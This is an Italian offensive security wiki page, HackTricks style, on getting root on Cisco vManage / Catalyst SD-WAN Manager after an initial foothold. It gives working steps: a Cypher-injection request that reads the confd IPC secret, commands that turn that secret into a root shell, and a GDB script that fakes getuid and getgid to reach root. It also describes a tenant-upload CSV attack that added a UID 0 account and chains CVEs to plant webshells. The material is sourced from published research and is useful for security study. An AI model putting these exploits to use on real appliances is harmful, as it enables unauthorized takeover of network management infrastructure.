# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Una volta ottenuta la code execution su Cisco vManage / *Catalyst SD-WAN Manager* come `vmanage`, `netadmin` o `vmanage-admin`, le superfici di local privesc più interessanti sono generalmente lo stack CLI `confd`, l'helper `cmdptywrapper`, le REST API su localhost e gli handler di import/upload eseguiti con privilegi root.

Se hai ancora bisogno dell'**initial foothold** su un controller, consulta prima la pagina dedicata al control plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Rapida triage locale
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Se `/etc/confd/confd_ipc_secret` è leggibile dal tuo foothold, Path 1 e Path 2 diventano immediatamente praticabili. Se arrivi tramite una remote file disclosure o una webshell, controlla anche il materiale SSH di `vmanage-admin` e gli upload handler della multitenancy; ricerche recenti hanno dimostrato che entrambi sono pivot praticabili.<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

La valutazione di vManage di Synacktiv documenta questo percorso verso una root-shell.<sup>[[5]](#references)</sup>

La [documentazione di ConfD](http://66.218.245.39/doc/html/rn03re18.html) collegata dal report descrive l'autenticazione IPC; l'esempio vManage indica il secret in `/etc/confd/confd_ipc_secret` e mostra che è leggibile da `vmanage`.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Poiché Neo4j viene eseguito con i privilegi di `vmanage` nella configurazione segnalata, la precedente injection Cypher può leggere il file segreto.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` stesso non accetta argomenti da riga di comando; invoca `/usr/bin/confd_cli_user`. Il workflow descritto estrae quell'helper leggibile da root dal rootfs, lo copia tramite `scp`, ne legge l'help, imposta `CONFD_IPC_ACCESS_FILE` e lo esegue con `-U 0 -G 0` per ottenere una root shell.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Percorso 2

Questo percorso alternativo è adattato dalla ricerca di Walmart Global Tech su vManage 19.2.2.<sup>[[6]](#references)</sup>

Il percorso Synacktiv richiede una copia di `/usr/bin/confd_cli_user`, leggibile da root nella configurazione descritta; il report di Walmart modifica invece i valori di identità di `confd_cli` in GDB.<sup>[[5]](#references)[[6]](#references)</sup>

La disassembly del report mostra `confd_cli` mentre raccoglie l'UID e il GID del chiamante.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump che mostra la raccolta di UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Lo stesso test ha mostrato un `cmdptywrapper`, di proprietà di root, che riceveva valori espliciti per `-g` e `-u`.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Il ricercatore ha dedotto che `confd_cli` inoltra l'UID e il GID dell'utente autenticato a `cmdptywrapper`.<sup>[[6]](#references)</sup>

L'esecuzione diretta di `cmdptywrapper` con `-g 0 -u 0` non è riuscita perché il file descriptor richiesto (`-i 1015` nell'esempio) non era disponibile.<sup>[[6]](#references)</sup>

Poiché `confd_cli` non espone questi valori come argomenti, il report usa GDB per sovrascrivere i valori restituiti da `getuid()` e `getgid()`; GDB era presente su quell'appliance.<sup>[[5]](#references)[[6]](#references)</sup>

Con l'accesso a `vmanage`, il test poteva leggere `/etc/confd/confd_ipc_secret`; il seguente script forza entrambe le chiamate relative all'identità a restituire zero.<sup>[[6]](#references)</sup>

Lo script GDB usato nel report è:<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
L'output della console riportato è:<sup>[[6]](#references)</sup>

<details>
<summary>Console output</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (bug di validazione dell'input della CLI del 2025 - CVE-2025-20122)

Cisco ha successivamente documentato un percorso locale più semplice verso root nel proprio advisory per [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt). Un **attacker autenticato con soli privilegi read-only** poteva inviare una richiesta appositamente predisposta alla CLI del manager e ottenere root a causa di una validazione insufficiente dell'input.<sup>[[7]](#references)</sup>

Da una prospettiva offensive, questo advisory e la ricerca precedente sulla CLI suggeriscono il seguente workflow.<sup>[[6]](#references)[[7]](#references)</sup>

1. Una volta ottenuto *qualsiasi* low-priv foothold sul box, conviene testare il servizio CLI locale prima di procedere con il workflow più pesante di Path 1 / Path 2.
2. Riutilizza gli artifact di Path 2 per individuare il trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Considera sospetto ogni campo inoltrato al backend della CLI: UID/GID, username, metadati del terminale, file importati o qualsiasi valore successivamente utilizzato da un helper di proprietà di root.
4. Se un utente low-priv può raggiungere il socket CLI locale e influenzare tali campi, root potrebbe essere a una sola richiesta appositamente predisposta di distanza.

Dopo aver ottenuto l’accesso all’appliance, esamina la catena CLI locale come segue.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Questo trasforma il bug del 2025 in un hunting pattern riutilizzabile: cerca **local CLI shim che raccolgono l'identità in userland e la inoltrano a un wrapper privilegiato**.<sup>[[6]](#references)[[7]](#references)</sup>

Non confondere **CVE-2025-20122** con la successiva **CVE-2026-20122**: il problema del 2025 è un bug *locale* da CLI a root, mentre quello del 2026 è un arbitrary file overwrite remoto tramite API, utile soprattutto per piantare un foothold e poi tornare a Path 1 / Path 2 / Path 4.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

L'advisory Cisco di febbraio 2026 descrive un'altra utile classe di privesc, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). Un **attaccante locale autenticato con privilegi ridotti** poteva ottenere root a causa di un meccanismo insufficiente di autenticazione degli utenti nella REST API.<sup>[[1]](#references)</sup>

Questo è importante perché il privesc su vManage non è più limitato all'abuso di `confd`/TTY; dopo aver ottenuto una low-priv shell, cerca anche quanto segue.<sup>[[1]](#references)</sup>

- endpoint API accessibili solo da localhost che si fidano eccessivamente del chiamante
- token, cookie o credenziali dei servizi leggibili dall'account corrente
- azioni riservate a root esposte tramite handler `dataservice`/REST che possono ancora essere attivati localmente

In pratica, una volta ottenuta una shell come `vmanage` o un altro service user, l'abuso delle API locali può essere più facile da automatizzare rispetto all'abuso interattivo della CLI.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Se il contesto della sessione locale è sufficiente per raggiungere funzionalità REST con privilegi, preferisci il percorso API: è più facile da riprodurre, automatizzare tramite script e concatenare con web session o API token sottratti.<sup>[[1]](#references)</sup>

## Percorso 5 (file creato ad hoc nel 2026 elaborato da root - CVE-2026-20245)

Un altro pattern recente è [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). Un attaccante locale con privilegi `netadmin` poteva caricare un **file creato ad hoc** che la CLI elaborava successivamente in modo non sicuro, causando command injection come `root`.<sup>[[2]](#references)</sup>

Dal punto di vista di HackTricks, la tecnica di valore è più ampia della CVE specifica.<sup>[[2]](#references)</sup>

1. Enumera ogni workflow CLI o web che accetta un file: importazioni, pacchetti diagnostici, template, validator, backup, dati dei tenant, ecc.
2. Traccia dove viene salvato il file caricato e quale script o binario di proprietà di root lo utilizza.
3. Verifica se il nome del file, il contenuto del file o i metadati analizzati vengono mai passati a comandi shell, wrapper script o helper in stile `system()`.
4. Se puoi già raggiungere `netadmin` (credenziali valide, sessione sottratta o una catena di auth-bypass), i bug nell'elaborazione dei file sono spesso il percorso più rapido verso root.

Successivamente, Google Cloud / Mandiant hanno mostrato un caso concreto di questa classe di bug sfruttato tramite il percorso di importazione multitenancy.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Nell’attacco osservato, il CSV appositamente creato ha modificato `/etc/passwd` e `/etc/shadow` per creare un account temporaneo con UID 0 (`troot`). Questo rende particolarmente interessanti gli importer in stile `tenant-upload` / `tenant-list`: non sono solo funzionalità di acquisizione dati, ma potenziali front-end di parser eseguiti con privilegi root.<sup>[[4]](#references)</sup>

Un pattern rapido per la ricerca lato shell è:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Questa classe di bug si combina particolarmente bene con foothold remoti che concedono `netadmin` ma non `root`.<sup>[[2]](#references)[[4]](#references)</sup>

## Altre vulnerabilità recenti di vManage/Catalyst SD-WAN Manager da concatenare

- **Info leak non autenticato (CVE-2026-20133)** – Particolarmente prezioso perché la ricerca pubblica ha mostrato che poteva esporre `confd_ipc_secret` o la chiave privata di `vmanage-admin`, trasformando un bug di lettura in Path 1 oppure in un pivot NETCONF.<sup>[[3]](#references)</sup>
- **Sovrascrittura arbitraria di file tramite API autenticata (CVE-2026-20122)** – Diverso dal bug CLI del 2025 descritto sopra; VulnCheck lo ha utilizzato per caricare una webshell, rendendo immediatamente rilevanti i percorsi di privesc locali presenti in questa pagina.<sup>[[3]](#references)</sup>
- **XSS autenticato nell'interfaccia web (CVE-2024-20475)** – Un attacker autenticato può eseguire script nell'interfaccia web di un utente interessato; valuta se il contesto della sessione risultante espone azioni API/CLI in grado di raggiungere `vshell` o uno dei percorsi di privesc locali descritti sopra.<sup>[[9]](#references)</sup>
- **Auth bypass remoto a `netadmin` (CVE-2026-20129)** – Precursore molto efficace per Path 5, perché `netadmin` è esattamente il livello richiesto dal privesc tramite file appositamente creato del 2026.<sup>[[2]](#references)[[3]](#references)</sup>
- **Scrittura arbitraria di file autenticata (CVE-2026-20262)** – Valore offensivo simile a quello di CVE-2026-20122, ma attraverso un successivo percorso di upload dell'interfaccia web; Cisco afferma che un file creato o sovrascritto dal bug potrebbe essere utilizzato in seguito per elevare i privilegi a root.<sup>[[10]](#references)</sup>
- **Downgrade per riesumare il vecchio privesc CLI (CVE-2022-20775)** – Le intrusioni del 2026 hanno mostrato che gli attacker possono tornare a una build SD-WAN più vecchia e vulnerabile, sfruttare il vecchio bug CLI per ottenere root e quindi ripristinare la versione originale.<sup>[[8]](#references)</sup>
- **Auth bypass del control plane pre-auth (CVE-2026-20182)** – Documentato meglio nella pagina dedicata al control plane SD-WAN; può aggiungere una chiave SSH per `vmanage-admin`, fornendo accesso NETCONF persistente per le azioni successive sul management plane.<sup>[[11]](#references)</sup>



## References

- [1] [Vulnerabilità Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129, ecc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Vulnerabilità di privilege escalation autenticata in Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager e Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Vulnerabilità recenti di Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: sfruttamento zero-day della vulnerabilità (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting di Cisco SD-WAN, parte 1: attacco a vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking di Cisco SD-WAN vManage 19.2.2 — dal CSRF alla Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Vulnerabilità di privilege escalation in Cisco Catalyst SD-WAN Manager (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Sfruttamento attivo di Cisco Catalyst SD-WAN da parte di UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Vulnerabilità Cross-Site Scripting in Cisco Catalyst SD-WAN Manager (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Vulnerabilità di scrittura arbitraria di file in Cisco Catalyst SD-WAN Manager (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Auth bypass critico in Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
